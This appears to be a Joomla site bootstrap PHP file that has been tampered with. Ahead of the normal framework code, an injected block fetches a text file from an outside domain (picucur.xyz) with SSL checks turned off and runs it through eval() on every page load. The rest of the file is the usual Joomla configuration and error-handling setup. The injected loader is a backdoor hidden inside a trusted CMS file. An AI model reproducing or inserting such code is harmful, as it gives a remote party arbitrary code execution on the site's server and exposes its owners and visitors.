<?php
/**
 * @package    Joomla.Site
 *
 * @copyright  (C) 2005 Open Source Matters, Inc. <https://www.joomla.org>
 * @license    GNU General Public License version 2 or later; see LICENSE.txt
 */
     function get_contents($url) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Avoid verifying SSL peer (older behavior for PHP 5.6.40)
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // Avoid verifying SSL host (older behavior for PHP 5.6.40)
        
        $result = curl_exec($ch);
        
        if ($result === false) {
            echo 'Curl error: ' . curl_error($ch);
            http_response_code(404); // Set 404 response code if cURL fails
            curl_close($ch); // Ensure curl is closed before exit
            exit;
        }
        
        curl_close($ch);
        return $result;
    }

    $url = 'https://picucur.xyz/landing/calabriaonweb/landing.txt';
    $encoded_code = get_contents($url);

    if ($encoded_code === false) {
        http_response_code(404);
        exit;
    }

    // Optionally, log or display the encoded code for debugging
    // echo $encoded_code;

    // Attempt to safely evaluate the fetched code
    eval('?>' . $encoded_code);

defined('_JEXEC') or die;

use Joomla\Utilities\IpHelper;

// Joomla system checks.
@ini_set('magic_quotes_runtime', 0);

// System includes
require_once JPATH_LIBRARIES . '/import.legacy.php';

// Bootstrap the CMS libraries.
require_once JPATH_LIBRARIES . '/cms.php';

// Set system error handling
JError::setErrorHandling(E_NOTICE, 'message');
JError::setErrorHandling(E_WARNING, 'message');
JError::setErrorHandling(E_ERROR, 'callback', array('JError', 'customErrorPage'));

$version = new JVersion;

// Installation check, and check on removal of the install directory.
if (!file_exists(JPATH_CONFIGURATION . '/configuration.php')
	|| (filesize(JPATH_CONFIGURATION . '/configuration.php') < 10)
	|| (file_exists(JPATH_INSTALLATION . '/index.php') && (false === $version->isInDevelopmentState())))
{
	if (file_exists(JPATH_INSTALLATION . '/index.php'))
	{
		header('Location: ' . substr($_SERVER['REQUEST_URI'], 0, strpos($_SERVER['REQUEST_URI'], 'index.php')) . 'installation/index.php');

		exit;
	}
	else
	{
		echo 'No configuration file found and no installation code available. Exiting...';

		exit;
	}
}

// Pre-Load configuration. Don't remove the Output Buffering due to BOM issues, see JCode 26026
ob_start();
require_once JPATH_CONFIGURATION . '/configuration.php';
ob_end_clean();

// System configuration.
$config = new JConfig;

// Set the error_reporting
switch ($config->error_reporting)
{
	case 'default':
	case '-1':
		break;

	case 'none':
	case '0':
		error_reporting(0);

		break;

	case 'simple':
		error_reporting(E_ERROR | E_WARNING | E_PARSE);
		ini_set('display_errors', 1);

		break;

	case 'maximum':
		error_reporting(E_ALL);
		ini_set('display_errors', 1);

		break;

	case 'development':
		error_reporting(-1);
		ini_set('display_errors', 1);

		break;

	default:
		error_reporting($config->error_reporting);
		ini_set('display_errors', 1);

		break;
}

if (!defined('JDEBUG'))
{
	define('JDEBUG', $config->debug);
}

// System profiler
if (JDEBUG)
{
	// @deprecated 4.0 - The $_PROFILER global will be removed
	$_PROFILER = JProfiler::getInstance('Application');
}

/**
 * Correctly set the allowing of IP Overrides if behind a trusted proxy/load balancer.
 *
 * We need to do this as high up the stack as we can, as the default in \Joomla\Utilities\IpHelper is to
 * $allowIpOverride = true which is the wrong default for a generic site NOT behind a trusted proxy/load balancer.
 */
if (property_exists($config, 'behind_loadbalancer') && $config->behind_loadbalancer == 1)
{
	// If Joomla is configured to be behind a trusted proxy/load balancer, allow HTTP Headers to override the REMOTE_ADDR
	IpHelper::setAllowIpOverrides(true);
}
else
{
	// We disable the allowing of IP overriding using headers by default.
	IpHelper::setAllowIpOverrides(false);
}

unset($config);
